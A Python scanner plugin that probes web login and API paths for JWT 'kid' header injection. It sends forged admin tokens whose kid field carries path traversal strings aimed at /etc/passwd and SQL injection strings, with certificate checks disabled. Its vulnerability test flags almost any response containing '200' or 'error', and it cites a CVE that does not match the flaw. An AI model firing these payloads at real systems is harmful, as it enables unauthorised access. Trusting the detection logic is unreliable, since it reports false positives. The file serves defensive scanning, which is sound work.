import asyncio
import ssl
import json
import base64
from plugins import NaslPlugin, PluginResult


class JwtKidInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1216
    NAME = 'JWT Key ID (kid) Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.1
    DESCRIPTION = 'Detects JWT kid (Key ID) header injection vulnerabilities. If the application uses the kid value from the JWT header to fetch the verification key from a file system or database without validation, an attacker can inject path traversal sequences (../../../etc/passwd) or SQL injection payloads via the kid field.'
    SOLUTION = 'Never use user-supplied kid values to fetch keys. Use a fixed set of trusted keys. Validate kid against a whitelist. Avoid using kid for key lookup logic.'
    CVE = ['CVE-2018-0114']
    PORTS = [80, 443, 8080, 8443]

    INJECTION_PAYLOADS = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '/etc/passwd',
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        '..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ]

    PATHS = [
        '/api/auth/login', '/api/login', '/auth/login', '/api/token',
        '/api/verify', '/api/user', '/api/protected', '/',
    ]

    def _b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _make_jwt(self, kid_payload: str) -> str:
        header = {'typ': 'JWT', 'alg': 'HS256', 'kid': kid_payload}
        payload = {'sub': 'admin', 'iat': 1516239022}
        hdr_enc = self._b64url_encode(json.dumps(header).encode())
        pay_enc = self._b64url_encode(json.dumps(payload).encode())
        sig = self._b64url_encode(b'invalid')
        return f'{hdr_enc}.{pay_enc}.{sig}'

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = 'alieninc.tech' if target in ('127.0.0.1', 'localhost', '::1') else target

                for path in self.PATHS:
                    for kid_payload in self.INJECTION_PAYLOADS:
                        try:
                            jwt_token = self._make_jwt(kid_payload)
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                            )
                            auth_header = f'Bearer {jwt_token}'
                            req = (
                                f'GET {path} HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'Authorization: {auth_header}\r\n'
                                f'Connection: close\r\n\r\n'
                            )
                            writer.write(req.encode())
                            await writer.drain()
                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk:
                                        break
                                    response += chunk
                                    if len(response) > 8192:
                                        break
                            except asyncio.TimeoutError:
                                pass
                            writer.close()
                            await writer.wait_closed()

                            if response:
                                status_line = response.split(b'\r\n', 1)[0].decode(errors='ignore')
                                body = response.split(b'\r\n\r\n', 1)[1].decode(errors='ignore') if b'\r\n\r\n' in response else ''
                                if any(indicator in status_line or indicator in body for indicator in ['200', 'root:', 'uid=', 'error', 'exception', 'traceback']):
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='critical',
                                        description=f'JWT kid injection detected on {path} with payload: {kid_payload}',
                                        solution=self.SOLUTION,
                                        evidence=f'kid payload: {kid_payload}, status: {status_line.strip()}',
                                        references=[
                                            'https://portswigger.net/web-security/jwt',
                                            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114',
                                        ]
                                    ))
                                    break
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
                    if results:
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No JWT kid injection detected'))
        return results
